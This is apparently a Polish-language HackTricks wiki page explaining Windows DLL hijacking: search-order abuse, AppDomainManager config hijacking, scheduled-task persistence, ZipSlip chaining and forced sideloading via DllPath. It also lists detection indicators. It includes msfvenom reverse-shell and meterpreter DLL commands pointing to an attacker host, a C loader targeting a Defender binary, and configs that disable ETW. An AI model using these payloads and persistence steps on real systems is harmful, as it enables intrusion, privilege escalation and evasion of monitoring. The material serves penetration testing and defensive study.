# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Podstawowe informacje

DLL Hijacking polega na skłonieniu zaufanej aplikacji do załadowania złośliwej biblioteki DLL. Termin ten obejmuje kilka taktyk, takich jak **DLL Spoofing, Injection i Side-Loading**. Jest wykorzystywany głównie do wykonywania kodu i zapewnienia trwałości, a rzadziej do eskalacji uprawnień. Mimo że tutaj skupiamy się na eskalacji, metoda hijackingu pozostaje taka sama niezależnie od celu.

### Typowe techniki

W DLL hijackingu stosuje się kilka metod, a ich skuteczność zależy od strategii ładowania bibliotek DLL przez aplikację:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Zastąpienie oryginalnej biblioteki DLL złośliwą, opcjonalnie przy użyciu DLL Proxying, aby zachować funkcjonalność oryginalnej biblioteki DLL.
2. **DLL Search Order Hijacking**: Umieszczenie złośliwej biblioteki DLL w ścieżce wyszukiwania poprzedzającej ścieżkę do legalnej biblioteki, z wykorzystaniem kolejności wyszukiwania aplikacji.
3. **Phantom DLL Hijacking**: Utworzenie złośliwej biblioteki DLL, którą aplikacja załaduje, sądząc, że jest to brakująca, wymagana biblioteka DLL.
4. **DLL Redirection**: Zmiana parametrów wyszukiwania, takich jak `%PATH%`, lub plików `.exe.manifest` / `.exe.local`, aby skierować aplikację do złośliwej biblioteki DLL.
5. **WinSxS DLL Replacement**: Zastąpienie legalnej biblioteki DLL jej złośliwym odpowiednikiem w katalogu WinSxS. Metoda ta jest często związana z DLL side-loading.
6. **Relative Path DLL Hijacking**: Umieszczenie złośliwej biblioteki DLL w kontrolowanym przez użytkownika katalogu razem ze skopiowaną aplikacją, co przypomina techniki Binary Proxy Execution.

Aplikacja może też implementować własny loader DLL. Uprzywilejowany proces może wyliczać zawartość katalogu podrzędnego, takiego jak `Libraries` lub `Plugins`, a następnie przekazać wybraną bibliotekę DLL do programu pomocniczego, niezależnie od standardowej kolejności wyszukiwania bibliotek DLL w Windows. Jeśli inne konto może tworzyć pliki w tym konkretnym katalogu, potraktuj to jako wskazówkę do dalszej analizy: potwierdź tożsamość procesu, efektywne ACL katalogu, regułę wyboru pliku oraz możliwość wywołania operacji ładowania. Sam fakt, że katalog obok pliku wykonywalnego jest zapisywalny, nie dowodzi, że proces ładuje z niego biblioteki DLL.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klasyczne DLL sideloading to nie jedyny sposób na skłonienie zaufanego procesu **.NET Framework** do załadowania kodu atakującego. Jeśli docelowy plik wykonywalny jest aplikacją **managed**, CLR sprawdza również **plik konfiguracyjny aplikacji** o nazwie odpowiadającej plikowi wykonywalnemu (na przykład `Setup.exe.config`). W tym pliku można zdefiniować niestandardowy **AppDomainManager**. Jeśli konfiguracja wskazuje na kontrolowaną przez atakującego bibliotekę umieszczoną obok pliku EXE, CLR załaduje ją **przed standardową ścieżką wykonywania kodu aplikacji** i uruchomi wewnątrz zaufanego procesu.<sup>[[24]](#references)</sup>

Zgodnie ze schematem konfiguracji .NET Framework firmy Microsoft, aby użyć niestandardowego managera, muszą być obecne zarówno `<appDomainManagerAssembly>`, jak i `<appDomainManagerType>`.<sup>[[16]](#references)[[17]](#references)</sup>

Minimalna konfiguracja:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Minimalny menedżer:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Praktyczne uwagi:
- To technika **specyficzna dla .NET Framework**. Zależy od parsowania konfiguracji CLR, a nie od kolejności wyszukiwania DLL w Win32.
- Host musi być rzeczywiście **managed EXE**. Szybka weryfikacja: `sigcheck -m target.exe`, `corflags target.exe` albo sprawdzenie obecności **CLR Runtime Header** w metadanych PE.
- Nazwa pliku konfiguracyjnego musi dokładnie odpowiadać nazwie pliku wykonywalnego (`<binary>.config`); zwykle znajduje się **obok pliku EXE**.
- Ta metoda jest przydatna w przypadku **podpisanych plików binarnych Microsoftu lub dostawców**, ponieważ zaufany plik EXE pozostaje nietknięty, a złośliwe managed assembly wykonuje się w tym samym procesie.
- Jeśli masz już zapisywalny katalog instalatora/aktualizacji, AppDomainManager hijacking może posłużyć jako **pierwszy etap**, a następnie można użyć klasycznego DLL sideloading lub reflective loading w kolejnych etapach.

### AppDomainManager jako downloader + bootstrapper scheduled task

Praktyczny wzorzec włamania polega na połączeniu zaufanego managed EXE ze złośliwym plikiem `*.config` i złośliwym AppDomainManager DLL, który pełni wyłącznie funkcję **niewielkiego bootstrappera**:<sup>[[25]](#references)</sup>

1. Użytkownik uruchamia podpisany instalator lub updater .NET z wiarygodnej lokalizacji, takiej jak `%USERPROFILE%\Downloads`.
2. Sąsiadujący plik config powoduje, że CLR ładuje assembly atakującego **przed rozpoczęciem działania logiki legalnej aplikacji**.
3. Złośliwy manager wykonuje **path gate** (na przykład kontynuuje działanie tylko wtedy, gdy host EXE działa z `Downloads`, i pozwala uruchomić drugi etap wyłącznie z `%LOCALAPPDATA%`).
4. Jeśli warunek zostanie spełniony, pobiera właściwy payload do ścieżki zapisywalnej przez użytkownika, takiej jak `%LOCALAPPDATA%\PerfWatson2.exe`, i ustanawia persistence za pomocą scheduled task.

Dlaczego ten wariant ma znaczenie:
- Podpisany host EXE pozostaje niezmieniony, więc triage sprawdzający wyłącznie hash głównego pliku binarnego może nie wykryć kompromitacji.
- Proste **path-based anti-analysis** jest powszechne: przeniesienie zestawu ZIP/EXE/DLL na Desktop, do Temp lub do ścieżki sandboxa może celowo przerwać łańcuch.
- DLL AppDomainManager pierwszego etapu może być niewielki i mało widoczny, podczas gdy właściwy implant zostanie pobrany później.

Minimalny przykład persistence często spotykany w tym wzorcu:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notatki:
- ` /rl highest` oznacza **najwyższy dostępny poziom** dla danego użytkownika/sesji; samo w sobie nie gwarantuje eskalacji do SYSTEM.
- Tę technikę często trafniej klasyfikować jako **uruchamianie/utrzymywanie dostępu przez nadużycie konfiguracji .NET** niż klasyczne hijacking kolejności wyszukiwania brakującej biblioteki DLL, choć operatorzy często łączą obie techniki.

Wskaźniki wykrywania:
- Podpisane pliki wykonywalne .NET uruchamiane ze **ścieżek rozpakowywania ZIP**, `Downloads`, `%TEMP%` lub innych folderów z prawem zapisu dla użytkownika, obok których znajduje się plik `<exe>.config`.
- Nowe zaplanowane zadania, których akcje wskazują ścieżki w `%LOCALAPPDATA%`, `%APPDATA%` lub `Downloads`, a których nazwy naśladują aktualizatory przeglądarek lub dostawców oprogramowania.
- Krótkotrwałe zarządzane procesy bootstrapujące, które natychmiast pobierają kolejny plik EXE, a następnie uruchamiają `schtasks.exe`.
- Próbki, które kończą działanie przedwcześnie, jeśli ścieżka pliku wykonywalnego nie pasuje do oczekiwanego katalogu profilu użytkownika.

### Hijacking istniejącego zaplanowanego zadania w celu ponownego uruchomienia łańcucha sideloadingu

Aby utrzymać dostęp, nie szukaj wyłącznie **tworzenia nowego zadania**. Niektóre grupy intruzyjne czekają, aż legalny instalator utworzy **zwykłe zadanie aktualizatora**, a następnie **przepisują akcję zadania**, tak aby istniejąca nazwa, autor i wyzwalacz nadal wyglądały znajomo dla obrońców.

Powtarzalny przebieg:
1. Zainstaluj/uruchom legalne oprogramowanie i znajdź zadanie, które zwykle tworzy.
2. Wyeksportuj XML zadania i zanotuj bieżące wartości `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Zmień wyłącznie akcję, aby zadanie uruchamiało zaufany plik hosta EXE z katalogu stagingowego z prawem zapisu dla użytkownika; plik ten następnie ładuje bocznie lub przez AppDomain rzeczywisty payload.
4. Ponownie zarejestruj zadanie pod tą samą nazwą, zamiast tworzyć nowy, oczywisty artefakt utrzymywania dostępu.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Dlaczego jest to bardziej dyskretne:
- Nazwa zadania nadal może wyglądać wiarygodnie (na przykład jako zadanie aktualizatora dostawcy).
- Uruchamia je usługa **Task Scheduler**, więc weryfikacja procesu nadrzędnego lub przodków często wykazuje oczekiwany łańcuch uruchamiania przez harmonogram, a nie `explorer.exe`.
- Zespoły DFIR, które szukają tylko **nowych nazw zadań**, mogą przeoczyć zadanie, którego rejestracja już istniała, ale którego akcja wskazuje teraz na `%LOCALAPPDATA%`, `%APPDATA%` lub inną ścieżkę kontrolowaną przez atakującego.

Szybkie punkty wyszukiwania:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Porównaj pliki XML w `C:\Windows\System32\Tasks\*` i metadane w `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` z wartością bazową.
- Generuj alert, gdy **zadanie aktualizatora wyglądające na pochodzące od dostawcy** uruchamia się z **katalogów z możliwością zapisu przez użytkownika** lub uruchamia plik .NET EXE z plikiem `*.config` w tym samym katalogu.

> [!TIP]
> Aby zapoznać się z łańcuchem krok po kroku, który łączy staging HTML, konfiguracje AES-CTR i implanty .NET z DLL sideloading, przejrzyj poniższy workflow.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Znajdowanie brakujących DLL

Najczęstszym sposobem znajdowania brakujących DLL w systemie jest uruchomienie [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) z pakietu sysinternals i **ustawienie** **2 poniższych filtrów**:

![Common Techniques - Finding missing Dlls: Najczęstszym sposobem znajdowania brakujących DLL w systemie jest uruchomienie procmon z pakietu sysinternals i ustawienie 2 poniższych filtrów](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: Najczęstszym sposobem znajdowania brakujących DLL w systemie jest uruchomienie procmon z pakietu sysinternals i ustawienie 2 poniższych filtrów](<../../../images/image (230).png>)

i wyświetlenie tylko **File System Activity**:

![Common Techniques - Finding missing Dlls: i wyświetlenie tylko File System Activity](<../../../images/image (153).png>)

Jeśli szukasz **ogólnie brakujących DLL**, pozostaw to uruchomione przez kilka **sekund**.\
Jeśli szukasz **brakującej DLL w konkretnym pliku wykonywalnym**, ustaw dodatkowy filtr, na przykład **"Process Name" "contains" `<exec name>`**, uruchom go i zatrzymaj przechwytywanie zdarzeń.<sup>[[9]](#references)</sup>

## Wykorzystywanie brakujących DLL

Aby eskalować uprawnienia, poszukaj **DLL, którą uprzywilejowany proces próbuje załadować** z lokalizacji, do której możesz zapisywać. Może się tak zdarzyć, gdy masz kontrolę nad katalogiem przeszukiwanym przed katalogiem zawierającym legalną DLL albo gdy żądana DLL nie istnieje, a ty możesz zapisywać w jednym z przeszukiwanych katalogów.

### Kolejność wyszukiwania DLL

**W** [**dokumentacji Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **znajdziesz szczegółowe informacje o sposobie ładowania DLL.**

**Aplikacje Windows** wyszukują DLL, korzystając z zestawu **predefiniowanych ścieżek wyszukiwania** w określonej kolejności. Problem DLL hijacking pojawia się, gdy szkodliwa DLL zostanie umieszczona w jednym z tych katalogów w taki sposób, by została załadowana przed autentyczną DLL. Aby temu zapobiec, aplikacja powinna używać ścieżek bezwzględnych przy odwoływaniu się do wymaganych DLL.

Poniżej znajduje się **kolejność wyszukiwania DLL w systemach 32-bitowych**:

1. Katalog, z którego załadowano aplikację.
2. Katalog systemowy. Użyj funkcji [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), aby uzyskać ścieżkę do tego katalogu.(_C:\Windows\System32_)
3. 16-bitowy katalog systemowy. Nie ma funkcji, która zwraca ścieżkę do tego katalogu, ale jest on przeszukiwany. (_C:\Windows\System_)
4. Katalog Windows. Użyj funkcji [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), aby uzyskać ścieżkę do tego katalogu.
   1. (_C:\Windows_)
5. Bieżący katalog.
6. Katalogi wymienione w zmiennej środowiskowej PATH. Pamiętaj, że nie obejmuje to ścieżki dla konkretnej aplikacji określonej w kluczu rejestru **App Paths**. Klucz **App Paths** nie jest używany przy ustalaniu ścieżki wyszukiwania DLL.

Jest to **domyślna** kolejność wyszukiwania przy włączonym **SafeDllSearchMode**. Po wyłączeniu tej opcji bieżący katalog przesuwa się na drugie miejsce. Aby wyłączyć tę funkcję, utwórz wartość rejestru **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i ustaw ją na 0 (domyślnie jest włączona).

Jeśli funkcja [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) zostanie wywołana z **LOAD_WITH_ALTERED_SEARCH_PATH**, wyszukiwanie rozpocznie się w katalogu modułu wykonywalnego, który **LoadLibraryEx** ładuje.

DLL można też załadować, podając ścieżkę bezwzględną zamiast nazwy. W takim przypadku Windows szuka samej DLL wyłącznie pod tą ścieżką; zależności wskazane nazwą nadal podlegają odpowiedniej kolejności wyszukiwania.

Istnieją też inne sposoby zmiany kolejności wyszukiwania, ale nie będę ich tutaj omawiać.

### Łączenie dowolnego zapisu pliku z hijackiem brakującej DLL

**Powiązana technika:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Użyj filtrów **ProcMon** (`Process Name` = docelowy EXE, `Path` kończy się na `.dll`, `Result` = `NAME NOT FOUND`), aby zebrać nazwy DLL, których proces szuka, ale nie może znaleźć.<sup>[[14]](#references)</sup>
2. Jeśli plik binarny działa według **harmonogramu lub jako usługa**, umieszczenie DLL o jednej z tych nazw w **katalogu aplikacji** (pozycja nr 1 w kolejności wyszukiwania) spowoduje jej załadowanie podczas następnego uruchomienia. W jednym przypadku skanera .NET proces szukał `hostfxr.dll` w `C:\samples\app\` przed załadowaniem rzeczywistej kopii z `C:\Program Files\dotnet\fxr\...`.
3. Zbuduj payload DLL (np. reverse shell) z dowolnym eksportem: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Jeśli dysponujesz prymitywem **dowolnego zapisu w stylu ZipSlip**, przygotuj ZIP, którego wpis wychodzi poza katalog rozpakowywania, tak aby DLL trafiła do katalogu aplikacji:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Dostarcz archiwum do monitorowanej skrzynki odbiorczej/udziału; gdy zaplanowane zadanie ponownie uruchomi proces, załaduje on złośliwą DLL i wykona twój kod jako konto usługi.

### Wymuszanie sideloadingu przez RTL_USER_PROCESS_PARAMETERS.DllPath

Zaawansowanym sposobem deterministycznego wpływania na ścieżkę wyszukiwania DLL nowo utworzonego procesu jest ustawienie pola DllPath w RTL_USER_PROCESS_PARAMETERS podczas tworzenia procesu za pomocą natywnych API ntdll. Podając tutaj katalog kontrolowany przez atakującego, można wymusić, aby proces docelowy, który rozwiązuje nazwę importowanej DLL (bez ścieżki bezwzględnej i bez użycia flag bezpiecznego ładowania), załadował złośliwą DLL z tego katalogu.

Kluczowa idea
- Zbuduj parametry procesu za pomocą RtlCreateProcessParametersEx i podaj własne DllPath wskazujące na kontrolowany przez ciebie folder (np. katalog, w którym znajduje się twój dropper/unpacker).
- Utwórz proces za pomocą RtlCreateUserProcess. Gdy plik binarny procesu docelowego będzie rozwiązywać nazwę DLL, loader uwzględni podany DllPath podczas wyszukiwania, umożliwiając niezawodny sideloading, nawet gdy złośliwa DLL nie znajduje się w tym samym katalogu co docelowy plik EXE.

Uwagi/ograniczenia
- Dotyczy to tworzonego procesu potomnego; różni się to od SetDllDirectory, które wpływa tylko na bieżący proces.
- Proces docelowy musi importować DLL lub ładować ją przez LoadLibrary na podstawie nazwy (bez ścieżki bezwzględnej i bez użycia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i zakodowane na sztywno ścieżki bezwzględne nie mogą zostać przejęte. Eksporty przekazywane dalej i SxS mogą zmienić kolejność wyszukiwania.

Minimalny przykład w C (ntdll, ciągi szerokoznakowe, uproszczona obsługa błędów):

<details>
<summary>Pełny przykład w C: wymuszanie sideloadingu DLL przez RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Przykład użycia operacyjnego
- Umieść złośliwy xmllite.dll (eksportujący wymagane funkcje lub przekazujący wywołania do prawdziwej biblioteki) w katalogu DllPath.
- Uruchom podpisany plik binarny, o którym wiadomo, że wyszukuje xmllite.dll po nazwie, używając opisanej powyżej techniki. Loader rozwiąże import za pomocą podanego DllPath i załaduje sideload Twojej biblioteki DLL.

Zaobserwowano, że technika ta jest wykorzystywana w rzeczywistych atakach do tworzenia wieloetapowych łańcuchów sideloadingu: początkowy launcher zapisuje pomocniczą bibliotekę DLL, która następnie uruchamia podpisany przez Microsoft, podatny na hijacking plik binarny z niestandardowym DllPath, aby wymusić załadowanie biblioteki DLL atakującego z katalogu stagingowego.<sup>[[6]](#references)</sup>


### Hijacking AppDomainManager w .NET za pośrednictwem `.exe.config`

W przypadku celów **.NET Framework** sideloading można przeprowadzić **przed `Main()`**, bez modyfikowania pamięci, wykorzystując sąsiadujący z aplikacją plik **`.exe.config`**. Zamiast polegać wyłącznie na kolejności wyszukiwania bibliotek DLL Win32, atakujący umieszcza legalny plik .NET EXE obok złośliwego pliku konfiguracyjnego i jednego lub kilku kontrolowanych przez siebie zestawów.

Jak działa ten łańcuch:<sup>[[15]](#references)[[22]](#references)</sup>
1. Uruchamia się host EXE, a **CLR odczytuje `<exe>.config`**.
2. Plik konfiguracyjny ustawia **`<appDomainManagerAssembly>`** i **`<appDomainManagerType>`**, aby środowisko uruchomieniowe utworzyło kontrolowany przez atakującego `AppDomainManager`.
3. Złośliwy manager uzyskuje **wykonanie przed `Main()`** w zaufanym procesie hosta.
4. Ten sam plik konfiguracyjny może wymusić, by CLR najpierw rozwiązywał lokalne zestawy (na przykład `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`), a także osłabić walidację i telemetrię środowiska uruchomieniowego bez patchowania inline.

Schemat typowy dla kampanii (dokładne zagnieżdżenie może się różnić w zależności od dyrektywy / wersji CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Dlaczego jest to przydatne:
- **`<probing privatePath="."/>`** ogranicza rozwiązywanie lokalizacji zestawów do katalogu aplikacji, zmieniając go w przewidywalną powierzchnię sideloadingu.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** przenoszą wykonanie do kodu atakującego podczas inicjalizacji CLR, zanim uruchomi się logika legalnej aplikacji.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** może pozwolić aplikacji z pełnym zaufaniem załadować niepodpisane lub zmodyfikowane zestawy bez błędu walidacji strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** zapobiega przekierowaniom przez publisher policy do nowszych zestawów.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** zwiększa przewidywalność wyboru środowiska uruchomieniowego.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** jest szczególnie interesujące, ponieważ **CLR wyłącza widoczność własnych zdarzeń ETW** za pomocą konfiguracji, zamiast gdy implant modyfikuje w pamięci `EtwEventWrite`.

Schemat operacyjny obserwowany w ostatnich kampaniach:
- Etap 1 zapisuje `setup.exe`, `setup.exe.config` i lokalne zestawy.
- Etap 2 kopiuje je do wiarygodnego katalogu **aktualizacji w AppData**, zmienia nazwę hosta na coś w rodzaju `update.exe` i ponownie go uruchamia za pomocą **zaplanowanego zadania**.
- Etap 3 weryfikuje kontekst wykonania (na przykład oczekiwanego procesu nadrzędnego `svchost.exe` uruchomionego przez Task Scheduler) przed załadowaniem końcowego eksportu/DLL RAT.

Pomysły na wykrywanie:
- Podpisane lub w inny sposób legalne **pliki wykonywalne .NET** uruchamiane z podejrzanymi plikami **`.config`** w sąsiadujących lokalizacjach z prawem zapisu dla użytkownika.
- Pliki `.config` zawierające **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** lub **`etwEnable enabled="false"`**.
- Zaplanowane zadania ponownie uruchamiające przemianowane pliki aktualizacji z **`%LOCALAPPDATA%`** lub katalogów aplikacji typu `\bin\update\`.
- Łańcuchy procesów nadrzędnych/potomnych, w których zaplanowane zadanie uruchamia zaufany host .NET, który natychmiast ładuje zestawy spoza dystrybutora z własnego katalogu.

#### Wyjątki od kolejności wyszukiwania dll opisane w dokumentacji Windows

W dokumentacji Windows opisano pewne wyjątki od standardowej kolejności wyszukiwania DLL:

- Gdy napotkany zostanie **plik DLL o takiej samej nazwie jak plik już załadowany do pamięci**, system pomija standardowe wyszukiwanie. Zamiast tego sprawdza przekierowania i manifest, a następnie domyślnie wybiera plik DLL znajdujący się już w pamięci. **W tym przypadku system nie wyszukuje pliku DLL**.
- Jeśli plik DLL jest rozpoznawany jako **znana DLL** dla bieżącej wersji Windows, system użyje swojej wersji tej znanej DLL wraz z jej zależnymi plikami DLL, **pomijając proces wyszukiwania**. Klucz rejestru **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** zawiera listę tych znanych plików DLL.
- Jeśli **plik DLL ma zależności**, wyszukiwanie zależnych plików DLL odbywa się tak, jakby wskazano je wyłącznie za pomocą ich **nazw modułów**, niezależnie od tego, czy początkowy plik DLL został znaleziony przy użyciu pełnej ścieżki.

### Eskalacja uprawnień

**Wymagania**:

- Znalezienie procesu, który działa lub będzie działał z **innymi uprawnieniami** (ruch poziomy lub boczny) i **nie ma wymaganej DLL**.
- Upewnienie się, że dostępny jest **zapis** do dowolnego **katalogu**, w którym będzie **wyszukiwana DLL**. Może to być katalog pliku wykonywalnego lub katalog znajdujący się w ścieżce systemowej.

Takie warunki rzadko występują domyślnie: uprzywilejowane pliki wykonywalne zazwyczaj nie mają brakujących zależności DLL, a zwykli użytkownicy normalnie nie mogą zapisywać w katalogach systemowej ścieżki wyszukiwania. Błędnie skonfigurowane środowiska mogą jednak stwarzać oba te problemy.\
Jeśli wymagania są spełnione, sprawdź projekt [UACME](https://github.com/hfiref0x/UACME). Choć jego głównym celem jest UAC bypass, zawiera PoC wykorzystujące DLL hijacking dla konkretnych wersji Windows, które często można dostosować do znalezionego katalogu z prawem zapisu.

Zwróć uwagę, że możesz **sprawdzić uprawnienia do folderu**, wykonując:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Oraz **sprawdź uprawnienia wszystkich folderów w PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Możesz też sprawdzić importy pliku wykonywalnego i eksporty DLL za pomocą:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Aby uzyskać pełny przewodnik po tym, jak **wykorzystać DLL Hijacking do eskalacji uprawnień** przy uprawnieniach do zapisu w **folderze System Path**, sprawdź:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Narzędzia automatyczne

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)sprawdzi, czy masz uprawnienia do zapisu w dowolnym folderze w systemowym PATH.\
Inne przydatne narzędzia automatyczne do wykrywania tej podatności to funkcje **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll._

### Przykład

Jeśli znajdziesz podatny scenariusz, jedną z najważniejszych rzeczy potrzebnych do jego skutecznego wykorzystania będzie **utworzenie dll eksportującej co najmniej wszystkie funkcje, które plik wykonywalny będzie z niej importował**. Pamiętaj jednak, że DLL Hijacking przydaje się do [**eskalacji z poziomu Medium Integrity do High (z pominięciem UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) lub z[ **High Integrity do SYSTEM**](../index.html#from-high-integrity-to-system)**.** Przykład **tworzenia poprawnej dll** znajdziesz w tym opracowaniu na temat DLL Hijacking, skupionym na uruchamianiu kodu: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ponadto w **następnej sekcji** znajdziesz kilka **podstawowych fragmentów kodu dll**, które mogą przydać się jako **szablony** lub do utworzenia **dll eksportującej niewymagane funkcje**.

## **Tworzenie i kompilowanie DLL**

### **Proksowanie DLL**

Zasadniczo **proxy DLL** to DLL zdolna do **wykonania złośliwego kodu po załadowaniu**, a jednocześnie do **udostępniania** funkcji i **działania** zgodnie z **oczekiwaniami** poprzez **przekazywanie wszystkich wywołań do prawdziwej biblioteki**.

Za pomocą narzędzia [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) lub [**Spartacus**](https://github.com/Accenture/Spartacus) możesz **wskazać plik wykonywalny i wybrać bibliotekę**, którą chcesz sproksować, a następnie **wygenerować sproksowaną dll**, albo **wskazać DLL** i **wygenerować sproksowaną dll**.

### **Meterpreter**

**Uzyskaj rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Uzyskaj meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

